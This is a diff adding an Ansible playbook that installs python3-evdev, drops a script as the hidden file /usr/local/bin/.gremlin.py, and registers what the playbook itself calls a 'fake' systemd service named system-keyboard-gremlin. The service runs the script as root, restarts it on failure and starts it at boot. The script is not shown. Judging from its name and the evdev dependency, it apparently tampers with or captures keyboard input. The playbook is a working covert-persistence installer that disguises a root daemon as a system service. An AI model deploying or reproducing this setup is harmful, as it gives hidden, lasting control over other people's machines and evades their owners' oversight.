@@ -1,0 +1,36 @@
+---
+- name: 1. Ensure python3-evdev is installed
+  ansible.builtin.apt:
+    name: python3-evdev
+    state: present
+    update_cache: yes
+
+- name: 2. Drop the gremlin script into /usr/local/bin
+  ansible.builtin.copy:
+    src: ../gremlin.py
+    dest: /usr/local/bin/.gremlin.py
+    mode: '0755'
+
+- name: 3. Create the fake systemd service file
+  ansible.builtin.copy:
+    dest: /etc/systemd/system/system-keyboard-gremlin.service
+    content: |
+      [Unit]
+      Description=Keyboard Gremlin Daemon
+      After=network.target
+
+      [Service]
+      ExecStart=/usr/bin/python3 /usr/local/bin/.gremlin.py
+      Restart=always
+      RestartSec=20
+      User=root
+
+      [Install]
+      WantedBy=multi-user.target
+
+- name: 4. Reload systemd and start the gremlin service
+  ansible.builtin.systemd:
+    daemon_reload: yes
+    name: system-keyboard-gremlin
+    enabled: yes
+    state: restarted
